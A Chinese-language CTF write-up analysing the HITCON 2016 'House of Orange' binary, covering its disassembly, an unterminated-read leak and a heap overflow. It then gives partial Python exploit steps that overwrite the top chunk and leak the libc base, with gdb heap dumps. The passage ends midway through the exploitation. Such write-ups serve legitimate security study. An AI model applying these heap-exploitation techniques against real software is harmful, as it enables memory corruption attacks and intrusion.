---
layout: post
title: pwn HITCONCTF2016 House_of_Orange
category: CTF
tags: ctf
keywords: ctf, binary, hack
description:
---

- [题目复现](#题目复现)
- [题目解析](#题目解析)
- [漏洞利用](#漏洞利用)
- [参考资料](#参考资料)


## 题目复现
```
$ file houseoforange 
houseoforange: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a58bda41b65d38949498561b0f2b976ce5c0c301, stripped
$ checksec -f houseoforange
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY Fortified Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   Yes     1               3       houseoforange
$ strings libc-2.23.so | grep "GNU C"
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu3) stable release version 2.23, by Roland McGrath et al.
Compiled by GNU CC version 5.3.1 20160413.
```
64 位程序，保护全开，默认开启 ASLR。

在 Ubuntu16.04 上玩一下：
```
$ ./houseoforange
+++++++++++++++++++++++++++++++++++++
@          House of Orange          @
+++++++++++++++++++++++++++++++++++++
 1. Build the house                  
 2. See the house                    
 3. Upgrade the house                
 4. Give up                          
+++++++++++++++++++++++++++++++++++++
Your choice : 1                                 <-- Build a house
Length of name :20
Name :AAAAAAAAAAAAAAAAAAA
Price of Orange:1
+++++++++++++++++++++++++++++++++++++
 1. Red            
 2. Green            
 3. Yellow            
 4. Blue            
 5. Purple            
 6. Cyan            
 7. White            
+++++++++++++++++++++++++++++++++++++
Color of Orange:1
Finish
+++++++++++++++++++++++++++++++++++++
@          House of Orange          @
+++++++++++++++++++++++++++++++++++++
 1. Build the house                  
 2. See the house                    
 3. Upgrade the house                
 4. Give up                          
+++++++++++++++++++++++++++++++++++++
Your choice : 3                                 <-- Upgrade the house
Length of name :10
Name:BBBBBBBBBB
Price of Orange: +++++++++++++++++++++++++++++++++++++
 1. Red            
 2. Green            
 3. Yellow            
 4. Blue            
 5. Purple            
 6. Cyan            
 7. White            
+++++++++++++++++++++++++++++++++++++
Color of Orange: 1
Finish
+++++++++++++++++++++++++++++++++++++
@          House of Orange          @
+++++++++++++++++++++++++++++++++++++
 1. Build the house                  
 2. See the house                    
 3. Upgrade the house                
 4. Give up                          
+++++++++++++++++++++++++++++++++++++
Your choice : 2                                 <-- See the house
Name of house : BBBBBBBBBBAAAAAAAAA

Price of orange : 0
        __             
        \/.--,         
        //_.'          
   .-""-/""----..      
  / . . . . . . . \    
 / . . . . . . . . \   
 |.  乂 . . . 乂. .|   
 \ . . . . . . . . |   
 \. . . . . . . . ./   
  \ . . . ＊. . . /    
   '-.__.__.__._-'     

+++++++++++++++++++++++++++++++++++++
@          House of Orange          @
+++++++++++++++++++++++++++++++++++++
 1. Build the house                  
 2. See the house                    
 3. Upgrade the house                
 4. Give up                          
+++++++++++++++++++++++++++++++++++++
Your choice : 4
give up
```
程序允许我们对 house 进行 Build、See 和 Upgrade 的操作。可以看到在 See 的时候似乎有点问题，"A"的字符串应该是 Upgrade 之前的，但这里还是被打印了出来，猜测可能存在信息泄露，需要重点关注。


## 题目解析
#### Build the house
```
[0x00000af0]> pdf @ sub.Too_many_house_d37
/ (fcn) sub.Too_many_house_d37 431
|   sub.Too_many_house_d37 (int arg_7h, int arg_1000h, int arg_ddaah);
|           ; var int local_18h @ rbp-0x18
|           ; var int local_14h @ rbp-0x14
|           ; var int local_10h @ rbp-0x10
|           ; var int local_8h @ rbp-0x8
|           ; var int local_0h @ rbp-0x0
|           ; arg int arg_7h @ rbp+0x7
|           ; arg int arg_1000h @ rbp+0x1000
|           ; arg int arg_ddaah @ rbp+0xddaa
|           ; CALL XREF from 0x000013fd (main)
|           0x00000d37      push rbp
|           0x00000d38      mov rbp, rsp
|           0x00000d3b      sub rsp, 0x20
|           0x00000d3f      lea rax, [0x00203070]                       ; [0x00203070] 存放 house_num
|           0x00000d46      mov eax, dword [rax]
|           0x00000d48      cmp eax, 3
|       ,=< 0x00000d4b      jbe 0xd63                                   ; 最多 4 个 house
|       |   0x00000d4d      lea rdi, str.Too_many_house                ; 0x1e3f ; "Too many house"
|       |   0x00000d54      call sym.imp.puts                          ; int puts(const char *s)
|       |   0x00000d59      mov edi, 1
|       |   0x00000d5e      call sym.imp._exit                         ; void _exit(int status)
|       |   ; CODE XREF from 0x00000d4b (sub.Too_many_house_d37)
|       `-> 0x00000d63      mov edi, 0x10
|           0x00000d68      call sym.imp.malloc                         ; rax = malloc(0x10) 给 house struct 分配空间
|           0x00000d6d      mov qword [local_10h], rax                  ; house 的地址放到 [local_10h]
|           0x00000d71      lea rdi, str.Length_of_name_:              ; 0x1e4e ; "Length of name :"
|           0x00000d78      mov eax, 0
|           0x00000d7d      call sym.imp.printf                        ; int printf(const char *format)
|           0x00000d82      mov eax, 0
|           0x00000d87      call sub.__read_chk_c65                     ; 读入 length
|           0x00000d8c      mov dword [local_18h], eax                  ; length 放到 [local_18h]
|           0x00000d8f      cmp dword [local_18h], 0x1000              ; [0x1000:4]=0x2062058d
|       ,=< 0x00000d96      jbe 0xd9f                                   ; length 小于等于 0x1000 时跳转
|       |   0x00000d98      mov dword [local_18h], 0x1000               ; 否则 length 设置为 0x1000
|       |   ; CODE XREF from 0x00000d96 (sub.Too_many_house_d37)
|       `-> 0x00000d9f      mov eax, dword [local_18h]
|           0x00000da2      mov rdi, rax
|           0x00000da5      call sym.imp.malloc                         ;  rax = malloc(length) 给 name 分配空间
|           0x00000daa      mov rdx, rax                                ; name 的地址放到 rdx
|           0x00000dad      mov rax, qword [local_10h]                  ; 取出 house
|           0x00000db1      mov qword [rax + 8], rdx                    ; house->name = name
|           0x00000db5      mov rax, qword [local_10h]
|           0x00000db9      mov rax, qword [rax + 8]                    ; 取出 house->name
|           0x00000dbd      test rax, rax
|       ,=< 0x00000dc0      jne 0xdd8                                   ; house->name 不为空时跳转
|       |   0x00000dc2      lea rdi, str.Malloc_error                   ; 否则报错并退出
|       |   0x00000dc9      call sym.imp.puts                          ; int puts(const char *s)
|       |   0x00000dce      mov edi, 1
|       |   0x00000dd3      call sym.imp._exit                         ; void _exit(int status)
|       |   ; CODE XREF from 0x00000dc0 (sub.Too_many_house_d37)
|       `-> 0x00000dd8      lea rdi, str.Name_:                        ; 0x1e70 ; "Name :"
|           0x00000ddf      mov eax, 0
|           0x00000de4      call sym.imp.printf                        ; int printf(const char *format)
|           0x00000de9      mov rax, qword [local_10h]
|           0x00000ded      mov rax, qword [rax + 8]                    ; 取出 house->name
|           0x00000df1      mov edx, dword [local_18h]                  ; 取出 length
|           0x00000df4      mov esi, edx
|           0x00000df6      mov rdi, rax
|           0x00000df9      call sub.read_c20                           ; 调用 read_c20(house->name, length) 读入 name
|           0x00000dfe      mov esi, 8
|           0x00000e03      mov edi, 1
|           0x00000e08      call sym.imp.calloc                         ; rax = calloc(1, 8) 分配一个 8 bytes 的空间作为 orange struct
|           0x00000e0d      mov qword [local_8h], rax                   ; orange 的地址放到 [local_8h]
|           0x00000e11      lea rdi, [0x00001e77]                      ; "Price of Orange:"
|           0x00000e18      mov eax, 0
|           0x00000e1d      call sym.imp.printf                        ; int printf(const char *format)
|           0x00000e22      mov eax, 0
|           0x00000e27      call sub.__read_chk_c65                     ; 读入 price
|           0x00000e2c      mov edx, eax                                ; price 赋值给 edx
|           0x00000e2e      mov rax, qword [local_8h]                   ; 取出 orange
|           0x00000e32      mov dword [rax], edx                        ; orange->price = price
|           0x00000e34      mov eax, 0
|           0x00000e39      call sub._cc4                               ; 打印 color 菜单
|           0x00000e3e      lea rdi, [0x00001e88]                      ; "Color of Orange:"
|           0x00000e45      mov eax, 0
|           0x00000e4a      call sym.imp.printf                        ; int printf(const char *format)
|           0x00000e4f      mov eax, 0
|           0x00000e54      call sub.__read_chk_c65                     ; 读入 color
|           0x00000e59      mov dword [local_14h], eax                  ; color 放到 [local_14h]
|           0x00000e5c      cmp dword [local_14h], 0xddaa              ; [0xddaa:4]=-1
|       ,=< 0x00000e63      je 0xe87                                    ; color 等于 0xddaa 时跳转
|       |   0x00000e65      cmp dword [local_14h], 0
|      ,==< 0x00000e69      jle 0xe71
|      ||   0x00000e6b      cmp dword [local_14h], 7                   ; [0x7:4]=0
|     ,===< 0x00000e6f      jle 0xe87
|     |||   ; CODE XREF from 0x00000e69 (sub.Too_many_house_d37)
|     |`--> 0x00000e71      lea rdi, str.No_such_color                 ; 0x1e99 ; "No such color"
|     | |   0x00000e78      call sym.imp.puts                          ; int puts(const char *s)
|     | |   0x00000e7d      mov edi, 1
|     | |   0x00000e82      call sym.imp._exit                          ; 当 color != 0xddaa && (color <= 0 || color > 7) 时退出程序
|     | |   ; CODE XREF from 0x00000e63 (sub.Too_many_house_d37)
|     | |   ; CODE XREF from 0x00000e6f (sub.Too_many_house_d37)
|     `-`-> 0x00000e87      cmp dword [local_14h], 0xddaa              ; [0xddaa:4]=-1
|       ,=< 0x00000e8e      jne 0xe9c                                   ; color 不等于 0 时跳转
|       |   0x00000e90      mov rax, qword [local_8h]                   ; 否则取出 orange
|       |   0x00000e94      mov edx, dword [local_14h]                  ; 取出 color
|       |   0x00000e97      mov dword [rax + 4], edx                    ; orange->color = color
|      ,==< 0x00000e9a      jmp 0xea9
|      ||   ; CODE XREF from 0x00000e8e (sub.Too_many_house_d37)
|      |`-> 0x00000e9c      mov eax, dword [local_14h]                  ; 取出 color
|      |    0x00000e9f      lea edx, [rax + 0x1e]                       ; edx = color + 0x1e
|      |    0x00000ea2      mov rax, qword [local_8h]                   ; 取出 orange
|      |    0x00000ea6      mov dword [rax + 4], edx                    ; orange->color = edx == color + 0x1e
|      |    ; CODE XREF from 0x00000e9a (sub.Too_many_house_d37)
|      `--> 0x00000ea9      mov rax, qword [local_10h]                  ; 取出 house
|           0x00000ead      mov rdx, qword [local_8h]                   ; 取出 orange
|           0x00000eb1      mov qword [rax], rdx                        ; house->org = orange
|           0x00000eb4      lea rax, [0x00203068]
|           0x00000ebb      mov rdx, qword [local_10h]
|           0x00000ebf      mov qword [rax], rdx                        ; 将 house 的地址放到 [0x00203068]
|           0x00000ec2      lea rax, [0x00203070]
|           0x00000ec9      mov eax, dword [rax]
|           0x00000ecb      lea edx, [rax + 1]                          ; house_num += 1
|           0x00000ece      lea rax, [0x00203070]
|           0x00000ed5      mov dword [rax], edx
|           0x00000ed7      lea rdi, str.Finish                        ; 0x1ea7 ; "Finish"
|           0x00000ede      call sym.imp.puts                          ; int puts(const char *s)
|           0x00000ee3      nop
|           0x00000ee4      leave
\           0x00000ee5      ret
```
通过对这段代码的分析可以得到两个结构体：
```c
struct orange{
  int price;
  int color;
} orange;
struct house {
  orange *org;
  char *name;
} house;
```
Build 最多可以进行 4 次，整个过程有 2 个 malloc 和 1 个 calloc：
- `malloc(0x10)`：给 house struct 分配空间
- `malloc(length)`：给 name 分配空间，其中 length 来自用户输入，如果大于 0x1000，则按照 0x1000 处理。
- `calloc(1, 8)`：给 orange struct 分配空间

那么我们再来看一下用于读入 name 的函数：
```
[0x00000af0]> pdf @ sub.read_c20
/ (fcn) sub.read_c20 69
|   sub.read_c20 ();
|           ; var int local_1ch @ rbp-0x1c
|           ; var int local_18h @ rbp-0x18
|           ; var int local_4h @ rbp-0x4
|           ; var int local_0h @ rbp-0x0
|           ; CALL XREF from 0x00000df9 (sub.Too_many_house_d37)
|           ; CALL XREF from 0x00001119 (sub.You_can_t_upgrade_more_7c)
|           0x00000c20      push rbp
|           0x00000c21      mov rbp, rsp
|           0x00000c24      sub rsp, 0x20
|           0x00000c28      mov qword [local_18h], rdi
|           0x00000c2c      mov dword [local_1ch], esi
|           0x00000c2f      mov edx, dword [local_1ch]
|           0x00000c32      mov rax, qword [local_18h]
|           0x00000c36      mov rsi, rax
|           0x00000c39      mov edi, 0
|           0x00000c3e      call sym.imp.read                           ; 调用 read(0, house->name, length) 读入 name
|           0x00000c43      mov dword [local_4h], eax
|           0x00000c46      cmp dword [local_4h], 0
|       ,=< 0x00000c4a      jg 0xc62
|       |   0x00000c4c      lea rdi, str.read_error                    ; 0x14c8 ; "read error"
|       |   0x00000c53      call sym.imp.puts                          ; int puts(const char *s)
|       |   0x00000c58      mov edi, 1
|       |   0x00000c5d      call sym.imp._exit                         ; void _exit(int status)
|       |   ; CODE XREF from 0x00000c4a (sub.read_c20)
|       `-> 0x00000c62      nop
|           0x00000c63      leave
\           0x00000c64      ret
```
这个函数在读入 length 长度的字符串后，没有在末尾加上 `\x00` 截断，正如我们上面看到的，可能导致信息泄露。

#### See the house
```
[0x00000af0]> pdf @ sub.Name_of_house_:__s_ee6
/ (fcn) sub.Name_of_house_:__s_ee6 406
|   sub.Name_of_house_:__s_ee6 ();
|           ; CALL XREF from 0x00001409 (main)
|           0x00000ee6      push rbp
|           0x00000ee7      mov rbp, rsp
|           0x00000eea      lea rax, [0x00203068]
|           0x00000ef1      mov rax, qword [rax]                        ; 取出 house
|           0x00000ef4      test rax, rax
|       ,=< 0x00000ef7      je 0x106e                                   ; 如果不存在 house，函数返回
|       |   0x00000efd      lea rax, [0x00203068]
|       |   0x00000f04      mov rax, qword [rax]                        ; 取出 house
|       |   0x00000f07      mov rax, qword [rax]                        ; 取出 house->org
|       |   0x00000f0a      mov eax, dword [rax + 4]                    ; 取出 house->org->color，即 orange->color
|       |   0x00000f0d      cmp eax, 0xddaa
|      ,==< 0x00000f12      jne 0xf9d                                   ; orange->color 不等于 0xddaa 时跳转
|      ||   0x00000f18      lea rax, [0x00203068]
|      ||   0x00000f1f      mov rax, qword [rax]
|      ||   0x00000f22      mov rax, qword [rax + 8]                    ; 取出 house->name
|      ||   0x00000f26      mov rsi, rax
|      ||   0x00000f29      lea rdi, str.Name_of_house_:__s            ; 0x1eae ; "Name of house : %s\n"
|      ||   0x00000f30      mov eax, 0
|      ||   0x00000f35      call sym.imp.printf                         ; 打印 house->name
|      ||   0x00000f3a      lea rax, [0x00203068]
|      ||   0x00000f41      mov rax, qword [rax]
|      ||   0x00000f44      mov rax, qword [rax]
|      ||   0x00000f47      mov eax, dword [rax]                        ; 取出 orange->price
|      ||   0x00000f49      mov esi, eax
|      ||   0x00000f4b      lea rdi, str.Price_of_orange_:__d          ; 0x1ec2 ; "Price of orange : %d\n"
|      ||   0x00000f52      mov eax, 0
|      ||   0x00000f57      call sym.imp.printf                         ; 打印 orange->price
|      ||   0x00000f5c      call sym.imp.rand                           ; rand_num = rand() 生成一个随机数
|      ||   0x00000f61      mov edx, eax
|      ||   0x00000f63      mov eax, edx
|      ||   0x00000f65      sar eax, 0x1f
|      ||   0x00000f68      shr eax, 0x1d
|      ||   0x00000f6b      add edx, eax
|      ||   0x00000f6d      and edx, 7                                  ; rand_num % 8
|      ||   0x00000f70      sub edx, eax
|      ||   0x00000f72      mov eax, edx
|      ||   0x00000f74      mov edx, eax
|      ||   0x00000f76      lea rax, [0x00203080]
|      ||   0x00000f7d      movsxd rdx, edx
|      ||   0x00000f80      mov rax, qword [rax + rdx*8]                ; rax = [0x00203080 + rand_num % 8]
|      ||   0x00000f84      mov rsi, rax
|      ||   0x00000f87      lea rdi, str.e_01_38_5_214m_s_e_0m         ; 0x1ed8
|      ||   0x00000f8e      mov eax, 0
|      ||   0x00000f93      call sym.imp.printf                         ; 打印 orange 图案
|     ,===< 0x00000f98      jmp 0x107a                                  ; 跳转，函数返回
|     |`--> 0x00000f9d      lea rax, [0x00203068]
|     | |   0x00000fa4      mov rax, qword [rax]
|     | |   0x00000fa7      mov rax, qword [rax]
|     | |   0x00000faa      mov eax, dword [rax + 4]                    ; 取出 orange->color
|     | |   0x00000fad      cmp eax, 0x1e
|     |,==< 0x00000fb0      jle 0xfc7                                   ; orange->color 小于等于 0x1e 时跳转，程序退出
|     |||   0x00000fb2      lea rax, [0x00203068]
|     |||   0x00000fb9      mov rax, qword [rax]
|     |||   0x00000fbc      mov rax, qword [rax]
|     |||   0x00000fbf      mov eax, dword [rax + 4]                    ; 否则取出 orange->color
|     |||   0x00000fc2      cmp eax, 0x25                              ; '%'
|    ,====< 0x00000fc5      jle 0xfdd                                   ; orange->color 小于等于 0xfdd 时跳转
|    ||||   ; CODE XREF from 0x00000fb0 (sub.Name_of_house_:__s_ee6)
|    ||`--> 0x00000fc7      lea rdi, str.Color_corruption              ; 0x1eee ; "Color corruption!"
|    || |   0x00000fce      call sym.imp.puts                          ; int puts(const char *s)
|    || |   0x00000fd3      mov edi, 1
|    || |   0x00000fd8      call sym.imp._exit                         ; void _exit(int status)
|    || |   ; CODE XREF from 0x00000fc5 (sub.Name_of_house_:__s_ee6)
|    `----> 0x00000fdd      lea rax, [0x00203068]
|     | |   0x00000fe4      mov rax, qword [rax]
|     | |   0x00000fe7      mov rax, qword [rax + 8]                    ; 取出 house->name
|     | |   0x00000feb      mov rsi, rax
|     | |   0x00000fee      lea rdi, str.Name_of_house_:__s            ; 0x1eae ; "Name of house : %s\n"
|     | |   0x00000ff5      mov eax, 0
|     | |   0x00000ffa      call sym.imp.printf                         ; 打印 house->name
|     | |   0x00000fff      lea rax, [0x00203068]
|     | |   0x00001006      mov rax, qword [rax]
|     | |   0x00001009      mov rax, qword [rax]
|     | |   0x0000100c      mov eax, dword [rax]                        ; 取出 orange->price
|     | |   0x0000100e      mov esi, eax
|     | |   0x00001010      lea rdi, str.Price_of_orange_:__d          ; 0x1ec2 ; "Price of orange : %d\n"
|     | |   0x00001017      mov eax, 0
|     | |   0x0000101c      call sym.imp.printf                         ; 打印 house->price
|     | |   0x00001021      call sym.imp.rand                           ; rand_num = rand() 生成一个随机数
|     | |   0x00001026      mov edx, eax
|     | |   0x00001028      mov eax, edx
|     | |   0x0000102a      sar eax, 0x1f
|     | |   0x0000102d      shr eax, 0x1d
|     | |   0x00001030      add edx, eax
|     | |   0x00001032      and edx, 7                                  ; rand_num % 8
|     | |   0x00001035      sub edx, eax
|     | |   0x00001037      mov eax, edx
|     | |   0x00001039      mov edx, eax
|     | |   0x0000103b      lea rax, [0x00203080]
|     | |   0x00001042      movsxd rdx, edx
|     | |   0x00001045      mov rdx, qword [rax + rdx*8]                ; rdx = [0x00203080 + rand_num % 8]
|     | |   0x00001049      lea rax, [0x00203068]
|     | |   0x00001050      mov rax, qword [rax]
|     | |   0x00001053      mov rax, qword [rax]
|     | |   0x00001056      mov eax, dword [rax + 4]                    ; 取出 orange->color
|     | |   0x00001059      mov esi, eax
|     | |   0x0000105b      lea rdi, str.e__dm_s_e_0m                  ; 0x1f00
|     | |   0x00001062      mov eax, 0
|     | |   0x00001067      call sym.imp.printf                         ; 打印 orange 图案
|     |,==< 0x0000106c      jmp 0x107a
|     |||   ; CODE XREF from 0x00000ef7 (sub.Name_of_house_:__s_ee6)
|     ||`-> 0x0000106e      lea rdi, str.No_such_house                 ; 0x1f0d ; "No such house !"
|     ||    0x00001075      call sym.imp.puts                          ; int puts(const char *s)
|     ||    ; CODE XREF from 0x00000f98 (sub.Name_of_house_:__s_ee6)
|     ||    ; CODE XREF from 0x0000106c (sub.Name_of_house_:__s_ee6)
|     ``--> 0x0000107a      pop rbp
\           0x0000107b      ret
```
See 会打印出 house->name，orange->price 和 orange 图案。

#### Upgrade the house
```
[0x00000af0]> pdf @ sub.You_can_t_upgrade_more_7c
/ (fcn) sub.You_can_t_upgrade_more_7c 379
|   sub.You_can_t_upgrade_more_7c (int arg_7h, int arg_1000h, int arg_ddaah);
|           ; var int local_18h @ rbp-0x18
|           ; var int local_14h @ rbp-0x14
|           ; var int local_0h @ rbp-0x0
|           ; arg int arg_7h @ rbp+0x7
|           ; arg int arg_1000h @ rbp+0x1000
|           ; arg int arg_ddaah @ rbp+0xddaa
|           ; CALL XREF from 0x00001415 (main)
|           0x0000107c      push rbp
|           0x0000107d      mov rbp, rsp
|           0x00001080      push rbx
|           0x00001081      sub rsp, 0x18
|           0x00001085      lea rax, [0x00203074]
|           0x0000108c      mov eax, dword [rax]                        ; 取出 upgrade_num，初始值为 0
|           0x0000108e      cmp eax, 2                                  ; 最多修改 3 次
|       ,=< 0x00001091      jbe 0x10a4                                  ; upgrade_num 小于等于 2 时跳转
|       |   0x00001093      lea rdi, str.You_can_t_upgrade_more        ; 0x1f1d ; "You can't upgrade more"
|       |   0x0000109a      call sym.imp.puts                          ; int puts(const char *s)
|      ,==< 0x0000109f      jmp 0x11f0                                  ; 否则函数返回
|      ||   ; CODE XREF from 0x00001091 (sub.You_can_t_upgrade_more_7c)
|      |`-> 0x000010a4      lea rax, [0x00203068]
|      |    0x000010ab      mov rax, qword [rax]                        ; 取出 house
|      |    0x000010ae      test rax, rax
|      |,=< 0x000010b1      jne 0x10c4                                  ; house 不为 0 时跳转
|      ||   0x000010b3      lea rdi, str.No_such_house                 ; 0x1f0d ; "No such house !"
|      ||   0x000010ba      call sym.imp.puts                          ; int puts(const char *s)
|     ,===< 0x000010bf      jmp 0x11f0                                  ; 否则函数返回
|     |||   ; CODE XREF from 0x000010b1 (sub.You_can_t_upgrade_more_7c)
|     ||`-> 0x000010c4      lea rdi, str.Length_of_name_:              ; 0x1e4e ; "Length of name :"
|     ||    0x000010cb      mov eax, 0
|     ||    0x000010d0      call sym.imp.printf                        ; int printf(const char *format)
|     ||    ; DATA XREF from 0x00000d06 (sub._cc4)
|     ||    0x000010d5      mov eax, 0
|     ||    0x000010da      call sub.__read_chk_c65                     ; 读入 length
|     ||    0x000010df      mov dword [local_18h], eax                  ; 将 length 放到 [local_18h]
|     ||    0x000010e2      cmp dword [local_18h], 0x1000              ; [0x1000:4]=0x2062058d
|     ||,=< 0x000010e9      jbe 0x10f2                                  ; length 小于等于 0x1000 时跳转
|     |||   0x000010eb      mov dword [local_18h], 0x1000               ; 否则 length 赋值为 0x1000
|     |||   ; CODE XREF from 0x000010e9 (sub.You_can_t_upgrade_more_7c)
|     ||`-> 0x000010f2      lea rdi, str.Name:                         ; 0x1f34 ; "Name:"
|     ||    0x000010f9      mov eax, 0
|     ||    0x000010fe      call sym.imp.printf                        ; int printf(const char *format)
|     ||    0x00001103      lea rax, [0x00203068]
|     ||    0x0000110a      mov rax, qword [rax]
|     ||    0x0000110d      mov rax, qword [rax + 8]                    ; 取出 house->name
|     ||    0x00001111      mov edx, dword [local_18h]                  ; 取出 length
|     ||    0x00001114      mov esi, edx
|     ||    0x00001116      mov rdi, rax
|     ||    0x00001119      call sub.read_c20                           ; 调用 read_c20(house->name, length) 读入 name
|     ||    0x0000111e      lea rdi, str.Price_of_Orange:              ; 0x1f3a ; "Price of Orange: "
|     ||    0x00001125      mov eax, 0
|     ||    0x0000112a      call sym.imp.printf                        ; int printf(const char *format)
|     ||    0x0000112f      lea rax, [0x00203068]
|     ||    0x00001136      mov rax, qword [rax]
|     ||    0x00001139      mov rbx, qword [rax]                        ; 取出 house->org，即 orange
|     ||    0x0000113c      mov eax, 0
|     ||    0x00001141      call sub.__read_chk_c65                     ; 读入 price
|     ||    0x00001146      mov dword [rbx], eax                        ; orange->price = price
|     ||    0x00001148      mov eax, 0
|     ||    0x0000114d      call sub._cc4                               ; 打印 color 菜单
|     ||    0x00001152      lea rdi, str.Color_of_Orange:              ; 0x1f4c ; "Color of Orange: "
|     ||    0x00001159      mov eax, 0
|     ||    0x0000115e      call sym.imp.printf                        ; int printf(const char *format)
|     ||    0x00001163      mov eax, 0
|     ||    0x00001168      call sub.__read_chk_c65                     ; 读入 color
|     ||    0x0000116d      mov dword [local_14h], eax                  ; 将 color 放到 [local_14h]
|     ||    0x00001170      cmp dword [local_14h], 0xddaa              ; [0xddaa:4]=-1
|     ||,=< 0x00001177      je 0x119b                                   ; color 等于 0xddaa 时跳转
|     |||   0x00001179      cmp dword [local_14h], 0
|    ,====< 0x0000117d      jle 0x1185
|    ||||   0x0000117f      cmp dword [local_14h], 7                   ; [0x7:4]=0
|   ,=====< 0x00001183      jle 0x119b
|   |||||   ; CODE XREF from 0x0000117d (sub.You_can_t_upgrade_more_7c)
|   |`----> 0x00001185      lea rdi, str.No_such_color                 ; 0x1e99 ; "No such color"
|   | |||   0x0000118c      call sym.imp.puts                          ; int puts(const char *s)
|   | |||   0x00001191      mov edi, 1
|   | |||   0x00001196      call sym.imp._exit                          ; 当 color != 0xddaa && (color <= 0 || color > 7) 时退出程序
|   | |||   ; CODE XREF from 0x00001183 (sub.You_can_t_upgrade_more_7c)
|   | |||   ; CODE XREF from 0x00001177 (sub.You_can_t_upgrade_more_7c)
|   `---`-> 0x0000119b      cmp dword [local_14h], 0xddaa              ; [0xddaa:4]=-1
|     ||,=< 0x000011a2      jne 0x11b9                                  ; color 不等于 0xddaa 时跳转
|     |||   0x000011a4      lea rax, [0x00203068]
|     |||   0x000011ab      mov rax, qword [rax]
|     |||   0x000011ae      mov rax, qword [rax]                        ; 否则取出 house->org，即 orange
|     |||   0x000011b1      mov edx, dword [local_14h]                  ; 取出 color
|     |||   0x000011b4      mov dword [rax + 4], edx                    ; orange->color = color
|    ,====< 0x000011b7      jmp 0x11cf                                  ; 跳转
|    ||||   ; CODE XREF from 0x000011a2 (sub.You_can_t_upgrade_more_7c)
|    |||`-> 0x000011b9      lea rax, [0x00203068]
|    |||    0x000011c0      mov rax, qword [rax]
|    |||    0x000011c3      mov rax, qword [rax]                        ; 取出 house->org，即 orange
|    |||    0x000011c6      mov edx, dword [local_14h]                  ; 取出 color
|    |||    0x000011c9      add edx, 0x1e
|    |||    0x000011cc      mov dword [rax + 4], edx                    ; orange->color = color + 0x1e
|    |||    ; CODE XREF from 0x000011b7 (sub.You_can_t_upgrade_more_7c)
|    `----> 0x000011cf      lea rax, [0x00203074]
|     ||    0x000011d6      mov eax, dword [rax]                        ; 取出 upgrade_num
|     ||    0x000011d8      lea edx, [rax + 1]                          ; upgrade_num += 1
|     ||    0x000011db      lea rax, [0x00203074]
|     ||    0x000011e2      mov dword [rax], edx
|     ||    0x000011e4      lea rdi, str.Finish                        ; 0x1ea7 ; "Finish"
|     ||    0x000011eb      call sym.imp.puts                          ; int puts(const char *s)
|     ||    ; CODE XREF from 0x0000109f (sub.You_can_t_upgrade_more_7c)
|     ||    ; CODE XREF from 0x000010bf (sub.You_can_t_upgrade_more_7c)
|     ``--> 0x000011f0      add rsp, 0x18
|           0x000011f4      pop rbx
|           0x000011f5      pop rbp
\           0x000011f6      ret
```
Upgrade 最多可以进行 3 次，当确认 house 存在后，就直接在 orange->name 的地方读入长度为 length 的 name，然后读入新的 price 和 color。新的 length 同样来自用户输入，如果大于 0x1000，则按照 0x1000 处理。

这里的问题在于程序没有将新 length 与旧 length 做任何比较，如果新 length 大于 旧 length，那么将导致堆溢出。


## 漏洞利用
和常见的堆利用题目不同的是，这题只有 malloc 而没有 free，于是很多利用方法都用不了。当然这题是独创了一种 house-of-orange 的利用方法，这种方法利用堆溢出修改 `_IO_list_all` 结构体，从而改变程序流，前提是能够泄漏堆和 libc，泄露的方法是触发位于 `sysmalloc()` 中的 `_int_free()` 将 top chunk 释放到 unsorted bin 中（详细内容参考章节 3.1.8 和 4.13）。

#### overwrite top chunk
```python
def overwrite_top():
    build(0x10, 'AAAA')

    payload  = "A" * 0x30
    payload += p64(0) + p64(0xfa1)      # top chunk header
    upgrade(0x41, payload)
```
第一步，覆盖 top chunk 的 size 域，以触发 `sysmalloc()`。创建第一个 house：
```
gdb-peda$ x/16gx 0x555555758010-0x10
0x555555758000:	0x0000000000000000	0x0000000000000021  <-- house 1
0x555555758010:	0x0000555555758050	0x0000555555758030
0x555555758020:	0x0000000000000000	0x0000000000000021  <-- name 1
0x555555758030:	0x0000000a41414141	0x0000000000000000
0x555555758040:	0x0000000000000000	0x0000000000000021  <-- orange 1
0x555555758050:	0x0000001f00000001	0x0000000000000000
0x555555758060:	0x0000000000000000	0x0000000000020fa1  <-- top chunk
0x555555758070:	0x0000000000000000	0x0000000000000000
```
根据一定的规则修改 size，简单说就是这里 top chunk size 是 `0x20fa1`，那就修改为 `0xfa1`：
```
gdb-peda$ x/16gx 0x555555758010-0x10
0x555555758000:	0x0000000000000000	0x0000000000000021  <-- house 1
0x555555758010:	0x0000555555758050	0x0000555555758030
0x555555758020:	0x0000000000000000	0x0000000000000021  <-- name 1
0x555555758030:	0x4141414141414141	0x4141414141414141
0x555555758040:	0x4141414141414141	0x4141414141414141  <-- orange 1
0x555555758050:	0x0000001f00000001	0x4141414141414141
0x555555758060:	0x0000000000000000	0x0000000000000fa1  <-- fake top chunk
0x555555758070:	0x000000000000000a	0x0000000000000000
```

#### leak libc
```python
def leak_libc():
    global libc_base

    build(0x1000, 'AAAA')               # _int_free in sysmalloc

    build(0x400, 'A' * 7)               # large chunk
    libc_base = u64(see()) - 0x3c4188   # fd pointer

    log.info("libc_base address: 0x%x" % libc_base)
```
接下来分配一个大于 top chunk，小于 `mp_.mmap_threshold` 的 large chunk，此时将触发 `sysmalloc()` 中的 `_int_free()`，top chunk 将被释放到 unsorted bin 中，同时新的 top chunk 将由扩展方式分配出来：
```
gdb-peda$ x/26gx 0x555555758010-0x10
0x555555758000:	0x0000000000000000	0x0000000000000021  <-- house 1
0x555555758010:	0x0000555555758050	0x0000555555758030
0x555555758020:	0x0000000000000000	0x0000000000000021  <-- name 1
0x555555758030:	0x4141414141414141	0x4141414141414141
0x555555758040:	0x4141414141414141	0x4141414141414141  <-- orange 1
0x555555758050:	0x0000001f00000001	0x4141414141414141
0x555555758060:	0x0000000000000000	0x0000000000000021  <-- house 2
0x555555758070:	0x0000555555758090	0x0000555555779010
0x555555758080:	0x0000000000000000	0x0000000000000021  <-- orange 2
0x555555758090:	0x0000001f00000001	0x0000000000000000
0x5555557580a0:	0x0000000000000000	0x0000000000000f41  <-- old top chunk
